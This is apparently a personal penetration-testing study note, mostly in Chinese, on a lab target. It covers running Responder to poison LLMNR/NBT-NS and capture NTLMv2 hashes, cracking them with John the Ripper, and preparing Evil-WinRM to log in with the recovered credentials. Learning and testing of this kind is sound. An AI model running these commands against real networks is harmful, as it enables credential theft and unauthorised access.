### Responder 
[Kali_default_tools](https://www.kali.org/tools/responder/)
```
responder -h                                                                 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -r -f
or:
responder -I eth0 -wrf

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -r, --wredir          Enable answers for netbios wredir suffix queries.
                        Answering to wredir will likely break stuff on the
                        network. Default: False
  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
                        Answering to domain suffixes will likely break stuff
                        on the network. Default: False
  -f, --fingerprint     This option allows you to fingerprint a host that
                        issued an NBT-NS or LLMNR query.
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective when combined with
                        -r. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  -v, --verbose         Increase verbosity.
```
```
responder -I [選擇網卡] -wrf
```

## Responder 對靶機進行測試
![image](https://github.com/JackShih200190/Penetration_Test_Learn/assets/55253641/22c8fa3a-de34-403c-b744-96735e3cd8e3)

讓靶機發送一個假的請求到Kali端 一定會回傳錯誤，但因為Responder的監聽是啟動的，就會抓到一些NTLM的認證值

將我們抓到的登入Hash值進行破解
利用john這個破解工具並且針對NTLMv2來進行破解
```cmd
john --format=netntlmv2 hash.txt 
```

![image](https://github.com/JackShih200190/Penetration_Test_Learn/assets/55253641/123ddb73-3cb3-49e8-9c82-e09c61537a56)

我們得到了登入的帳號密碼利用WinRM的漏洞來進行攻擊

[WinRM預設Port](https://learn.microsoft.com/zh-tw/troubleshoot/windows-server/networking/service-overview-and-network-port)
[Evil-Winrm](https://www.kali.org/tools/evil-winrm/)
#### Evil-Winrm 安裝方式
```cmd
sudo gem install winrm winrm-fs stringio logger fileutils
git clone https://github.com/Hackplayers/evil-winrm.git
```
